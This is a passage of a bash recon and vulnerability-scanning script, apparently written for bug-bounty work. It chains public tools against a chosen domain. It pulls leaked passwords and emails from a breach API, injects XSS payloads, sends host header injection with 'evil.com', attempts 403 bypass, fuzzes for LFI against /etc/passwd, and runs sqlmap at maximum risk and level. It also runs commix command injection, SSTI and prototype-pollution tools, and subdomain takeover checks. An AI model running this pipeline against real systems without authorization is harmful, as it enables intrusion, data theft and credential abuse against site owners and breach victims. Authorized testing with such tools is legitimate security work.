    cat ${dirdomain}/parameters/endpoints.txt | gf ssti | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/ssti.txt
        cat ${dirdomain}/parameters/endpoints.txt | gf idor | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/idor.txt
   }
        
# Function to get info of the domains
get_info() {


    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Getting Leaked Passwords,Emails and Usernames - ${NORMAL}[${LRED}${BLINK}proxynova${NORMAL}]"
curl -s https://api.proxynova.com/comb?query=${target} |jq -r '.lines[]' >$leaks_file &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Getting Leaked Passwords,Emails and Usernames - ${NORMAL}[${GREEN}proxynova${TICK}${NORMAL}]${TTAB} LeakSearch: ${LGREEN}Completed"
       echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Getting Leaked Passwords,Emails and Usernames - ${NORMAL}[${LRED}${BLINK}SwaggerSpy${NORMAL}]"
python3 $TOOLS_DIR/SwaggerSpy/swaggerspy.py $target | grep -i "[*]\|URL" > ${dirdomain}/info/swagger_leaks.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Getting Leaked Passwords,Emails and Usernames - ${NORMAL}[${GREEN}SwaggerSpy${TICK}${NORMAL}]${TTAB} LeakSearch: ${LGREEN}Completed" 
    
echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Getting Leaked Passwords,Emails and Usernames - ${NORMAL}[${LRED}${BLINK}emailfinder${NORMAL}]"

emailfinder -d $target  | anew -q ${dirdomain}/info/emailfinder.txt
cat ${dirdomain}/info/emailfinder.txt | grep "@" | grep -iv "|_" | anew -q ${dirdomain}/info/emails.txt
rm -f ${dirdomain}/info/emailfinder.txt

echo -e "\033[2A"
echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Getting Leaked Passwords,Emails and Usernames  -  ${NORMAL}[${GREEN}emailfinder${TICK}${NORMAL}]${TTAB} Leaks Found: ${LGREEN}$(cat ${dirdomain}/info/emails.txt 2> /dev/null | wc -l )"


    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] WordPress Scanning  -  ${NORMAL}[${LRED}${BLINK}wpscan${NORMAL}]"
     wpscan --url $target --random-user-agent --enumerate vp,vt,cb,dbe --output $wpscan_output &>/dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] WordPress Scanned  -  ${NORMAL}[${GREEN}wpscan${TICK}${NORMAL}]${TTAB} CMS WordPress Found: ${LGREEN}$(cat $wpscan_output 2> /dev/null | wc -l )"


    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Joomla Scanning  -  ${NORMAL}[${LRED}${BLINK}joomscan${NORMAL}]"
     joomscan --url $target --ec --random-agent --output $joomscan_output &>/dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Joomla Scanned  -  ${NORMAL}[${GREEN}joomscan${TICK}${NORMAL}]${TTAB} CMS Joomla Found: ${LGREEN}$(cat $joomscan_output 2> /dev/null | wc -l )"


    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Drupal Scanning  -  ${NORMAL}[${LRED}${BLINK}droopescan${NORMAL}]"
     droopescan scan drupal -u $target -t 10 -o $droopescan_output &>/dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Drupal Scanned  -  ${NORMAL}[${GREEN}droopescan${TICK}${NORMAL}]${TTAB} CMS Drupal Found: ${LGREEN}$(cat $droopescan_output 2> /dev/null | wc -l )"




	whois $target | grep 'Domain\|Registry\|Registrar\|Updated\|Creation\|Registrant\|Name Server\|DNSSEC:\|Status\|Whois Server\|Admin\|Tech' | grep -v 'the Data in VeriSign Global Registry' | tee ${dirdomain}/info/whois.txt &> /dev/null
	

	whatweb -i $subdomains_live --log-brief ${dirdomain}/info/whatweb.txt &> /dev/null
echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Check if the Domains is running WordPress or Joomla or Drupal\n"
websites_file="$subdomains_live" 
CMSresult="${dirdomain}/info/CMSresult.txt"  
if [ ! -f "$websites_file" ]; then
    echo "Websites file not found: $websites_file"
    exit 1
fi
while IFS= read -r website; do
    html_content=$(curl -s "$website")        
    if echo "$html_content" | grep -q -E 'wp-content|wp-includes|wordpress|WordPress|Wordpress'; then
        cms="WordPress"
         if ! command -v wpscan &> /dev/null; then
            echo "wpscan is not installed. Please install it to scan WordPress sites."
        else
            wpscan --url "$website" >> "$CMSresult"
            echo "wpscan scan results appended to $CMSresult"
        fi
    elif echo "$html_content" | grep -q -E 'Joomla|joomla.xml'; then
        cms="Joomla"
    elif echo "$html_content" | grep -q -E 'shopify'; then
        cms="shopify"
    elif echo "$html_content" | grep -q -E 'hubspot'; then
        cms="hubspot"
    elif echo "$html_content" | grep -q -E 'weebly'; then
        cms="weebly"
     elif echo "$html_content" | grep -q -E 'wix'; then
        cms="wix"
      elif echo "$html_content" | grep -q -E 'moodle'; then
        cms="moodle"
      elif echo "$html_content" | grep -q -E 'prestashop'; then
        cms="prestashop"                   
    elif echo "$html_content" | grep -q -E 'Drupal|core/modules|composer/Plugin'; then
        cms="Drupal"
    else
        cms="Unknown"
    fi    
    if [ "$cms" != "Unknown" ]; then
        echo -ne "[+]${GREEN}$website${YELLOW} ========>is running $cms\n"
        echo -ne "$website ========>is running $cms" >> "$CMSresult"
    else
        echo -ne "${YELLOW}$website ${RED}Unknown\n"
    fi    
done < "$websites_file"
echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Check which Server the Domains is running\r"
Serverresult="${dirdomain}/info/Serverresult.txt"
while IFS= read -r website; do
    html_content=$(curl -I "$website" 2>&1 | grep -i 'server:')
    if [ "$html_content" != "Unknown" ]; then
echo -ne "[+]${GREEN}$website${YELLOW}   running $html_content\n"
echo -ne "[+]${GREEN}$website${YELLOW}   running $html_content" >>"$Serverresult"
else
echo -ne "[+]${YELLOW}$website ${RED}Unknown."
    fi 
done < "$websites_file"

}
# Function to get IPs of subdomains
get_ips() {

 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #  
    echo "Getting IPs of subdomains..."
 cat ${dirdomain}/subdomains/subdomains.txt | dnsx -a --resp-only --silent | anew $iptxt  &> /dev/null
 cat ${dirdomain}/subdomains/subdomains.txt | dnsx -a --resp --silent | anew ${dirdomain}/info/domain_ips.txt   &> /dev/null 
 naabu -list $iptxt -p $ports -c 150 --silent -o ${dirdomain}/info/portscan.txt    
 }
 # Function to check for vulnerabilities
check_vulnerabilities() {

# Add CMSeeK scanning
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Scanning CMS  -  ${NORMAL}[${LRED}${BLINK}CMSeeK${NORMAL}]"
    for url in $(cat ${dirdomain}/subdomains/livesubdomain.txt); do
        python3 $TOOLS_DIR/CMSeeK/cmseek.py -u $url --batch -r >> $cmseek_output
    done
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Scanning CMS  -  ${NORMAL}[${GREEN}CMSeeK${TICK}${NORMAL}]${TTAB} CMS Found: ${LGREEN}$(cat $cmseek_output 2> /dev/null | wc -l )"
 # Add gxss scanning
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] XSS Scanning with gxss  -  ${NORMAL}[${LRED}${BLINK}Scanning${NORMAL}]"
    cat ${dirdomain}/parameters/endpoints.txt | Gxss -c 100 -p Xss | grep "=" | qsreplace '"><svg onload=confirm(1)>' | while read url; do
        curl -s -L "$url" | grep -qs "<svg onload=confirm(1)>" && echo "$url" >> $gxss_output
    done
 
echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] XSS Scanning with gxss -  ${NORMAL}[${GREEN}Scanning${TICK}${NORMAL}]${TTAB} XSS Found: ${LGREEN}$(cat $gxss_output 2> /dev/null | wc -l )"
echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] XSS Scanning with freq  -  ${NORMAL}[${LRED}${BLINK}Scanning${NORMAL}]"
 payload=$(cat "$xss_list")
 cat ${dirdomain}/parameters/endpoints.txt | qsreplace '$payload' | freq | egrep -v 'Not' | anew -q $freq_output &> /dev/null
echo -e "\033[2A"
echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] XSS Scanning with freq -  ${NORMAL}[${GREEN}Scanning${TICK}${NORMAL}]${TTAB} XSS Found: ${LGREEN}$(cat $freq_output 2> /dev/null | wc -l )" 
 
printf "${NORMAL}${yellow}Gathering endpoints that they return 403 status code...${NORMAL}\n\n"
  cat ${dirdomain}/parameters/endpoints.txt |  httpx -silent -sc -title | grep 403 | grep "$target" | cut -d' ' -f1 | tee ${dirdomain}/parameters/endpoints_403.txt&> /dev/null

	printf "\n${NORMAL}${CYAN}Trying to bypass 403 status code...${NORMAL}\n\n"
	for url in $(cat $dirdomain/parameters/endpoints_403.txt);
	do

	      		bash $TOOLS_DIR/403-bypass.sh -u $url --exploit 
	done
	
  cat ${dirdomain}/parameters/endpoints.txt | qsreplace 'kalirfl' | httpx -silent -ms 'kalirfl' -o ${dirdomain}/parameters/refletidos.txt -t 75
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"></script><hTMl onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt
cat ${dirdomain}/parameters/refletidos.txt | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew ${dirdomain}/vulnerability/airi.txt

cat ${dirdomain}/vulnerability/airi.txt | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > ${dirdomain}/vulnerability/vuln-injections.txt 
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Host Header Injection${NORMAL}]\r"
for i in $(cat ${dirdomain}/subdomains/livesubdomain.txt); do
     file=$(curl -s -m5 -I  "{$i}" -H "X-Forwarded-Host: evil.com" &> /dev/null)  
    echo -n -e ${YELLOW}"URL: $i" >> ${dirdomain}/vulnerability/output.txt
    echo "$file" >> ${dirdomain}/vulnerability/output.txt
    if grep -q evil   <<<"$file"
  then
  echo  -e ${RED}"\nURL: $i  [Vulnerable]"${RED}
  cat ${dirdomain}/vulnerability/output.txt | grep -e URL  -e  evil   >> ${dirdomain}/vulnerability/vulnerable_Header.txt
  rm ${dirdomain}/vulnerability/output.txt
  else
  echo -n -e ${GREEN}"\nURL: $i  [Not Vulnerable]\n"
   rm ${dirdomain}/vulnerability/output.txt
 fi

done &> /dev/null

    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Host Header Injection${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/vulnerable_Header.txt 2> /dev/null | wc -l )"
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Information disclosure${NORMAL}]\r"
    
cat ${dirdomain}/subdomains/livesubdomain.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "$httpxpath" -mc 200 -t 60 |tee -a ${dirdomain}/info/Information.txt &> /dev/null
cat ${dirdomain}/subdomains/livesubdomain.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -p 80,443,8080,8443,9000,9001,9002,9003,8088 -threads 500 -title >> ${dirdomain}/info/Information.txt &> /dev/null
cat ${dirdomain}/info/Information.txt | grep -oP 'https?://[^\s]+' > ${dirdomain}/info/finalInfo.txt
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Information disclosure${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/info/finalInfo.txt 2> /dev/null | wc -l )"

    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}openreditrct${NORMAL}]\r"
cat ${dirdomain}/parameters/redirect.txt | openredirex --keyword FUZZ -p $TOOLS_DIR/OpenRedireX/payloads.txt| grep "^http" >  ${dirdomain}/vulnerability/redirect.txt &> /dev/null
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}openreditrct${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/redirect.txt 2> /dev/null | wc -l )"
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}LFI${NORMAL}]\r" 
  	  
 cat ${dirdomain}/parameters/lfi.txt |  httpx -silent -path $WORDLISTS_DIR/lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"  | anew -q $dirdomain/vulnerability/lfi.txt&> /dev/null
 echo -e "\033[2A"
     echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}LFI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/lfi.txt 2> /dev/null | wc -l )"
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}CRLF${NORMAL}]\r"
     crlfuzz -l ${dirdomain}/subdomains/livesubdomain.txt -s | anew $dirdomain/vulnerability/crlf.txt &> /dev/null
   #  crlfsuite -iT "$subdomains_live" -oN ${dirdomain}/vulnerability/crlfsuite.txt &> /dev/null
   echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}CRLF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/crlf.txt 2> /dev/null | wc -l )"
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SQLi${NORMAL}]\r"
   cat ${dirdomain}/parameters/liveendpoints.txt | grep ".php" | sed 's/.php.*/.php/' | sort -u | sed 's|$|%27%22%60|' | while read url ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url ${RED}Vulnerable\n" || echo -e "$url ${GREEN}Not Vulnerable\n" ; done 
    
    python3 $TOOLS_DIR/SQLiDetector/sqlidetector.py -f ${dirdomain}/parameters/sqli.txt -w 50 -o ${dirdomain}/parameters/sqlidetector.txt -t 10 &> /dev/null
   sqlmap -m ${dirdomain}/parameters/sqlidetector.txt --batch --risk 3 --random-agent --level 5 | tee -a $dirdomain/vulnerability/sqli.txt&> /dev/null
   
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SQLi${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/sqli.txt 2> /dev/null | wc -l )"
    
      echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}SSTI${NORMAL}]\r"
for url in $(cat ${dirdomain}/parameters/ssti.txt);do
tinja url -u $url
done
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}SSTI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $dirdomain/vulnerability/ssti.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}Prototype${NORMAL}]\r"
pphack -l ${dirdomain}/subdomains/livesubdomain.txt -o $prototype_file &> /dev/null
    
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}Prototype${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat $prototype_file 2> /dev/null | wc -l )"
 
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${LRED}${BLINK}command_injection${NORMAL}]\r"
 commix --batch -m ${dirdomain}/parameters/rce.txt --output-dir ${dirdomain}/vulnerability/command_injection.txt &> /dev/null
    
    echo -ne "${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${GREEN}command_injection${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat ${dirdomain}/vulnerability/command_injection.txt 2> /dev/null | wc -l )"
    # Add Subzy for subdomain takeover
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Checking Subdomain Takeover  -  ${NORMAL}[${LRED}${BLINK}Subzy${NORMAL}]"
    subzy run --targets ${dirdomain}/subdomains/subdomains.txt --hide_fails --verify_ssl -timeout 30 | anew -q $subzy_output
}
 # Function to generate a full report
generate_report() {
    echo -e "\n${BOLD}${GREEN} 
▒█▀▀█ █▀▀ █▀▀ █░░█ █░░ ▀▀█▀▀
▒█▄▄▀ █▀▀ ▀▀█ █░░█ █░░ ░░█░░
▒█░▒█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀▀▀ ░░▀░░\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains of ${RED}$target${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Found:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/subdomains/subdomains.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Alive:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/subdomains/livesubdomain.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Endpoints:${NORMAL}${BOLD}${GREEN} $(cat subdomains/endpoints.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} XSS:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/xss.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSTI:${NORMAL}${BOLD}${GREEN} $(cat $dirdomain/vulnerability/ssti.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SQLi:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/sqli.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Open Redirect:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/openredirect.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSRF:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/ssrf.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} CRLF:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/crlf.txt 2> /dev/null | wc -l)${NORMAL}\n"
    echo -ne "${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} LFI:${NORMAL}${BOLD}${GREEN} $(cat ${dirdomain}/vulnerability/lfi.txt 2> /dev/null | wc -l)${NORMAL}\n"



}

full_recon() {
    scan_subdomains
    DNSx_enumeration
    get_endpoints
    get_info
    get_ips
    check_vulnerabilities
    generate_report
}
# Main menu
while true; do
    echo -ne "${GREEN}Please choose an option:${NORMAL}\n"
    echo -ne "${GREEN}#################################\n"
    echo -ne "${GREEN}1. Scan for subdomains${NORMAL}\n"
    echo -ne "${GREEN}2. DNSx enumeration${NORMAL}\n"
    echo -ne "${GREEN}3. Get all endpoints${NORMAL}\n"
    echo -ne "${GREEN}4. Get Info of subdomains${NORMAL}\n"
    echo -ne "${GREEN}5. Get IPs of subdomains${NORMAL}\n"
    echo -ne "${GREEN}6. Check for vulnerabilities${NORMAL}\n"
    echo -ne "${GREEN}7. Generate a full report${NORMAL}\n"
    echo -ne "${GREEN}8. Full Recon${NORMAL}\n"
    echo -ne "${GREEN}9. Exit${NORMAL}\n"
    echo -ne "${GREEN}#################################\n"
    read -p "Enter your choice (1-8): " choice

    case $choice in
        1) scan_subdomains ;;
        2) DNSx_enumeration ;;
        3) get_endpoints ;;
        4) get_info ;;
        5) get_ips ;;
        6) check_vulnerabilities ;;
        7) generate_report ;;
        8) full_recon ;;
        9) exit ;;
        *) echo "Invalid option. Please try again." ;;
    esac

    echo
done
    
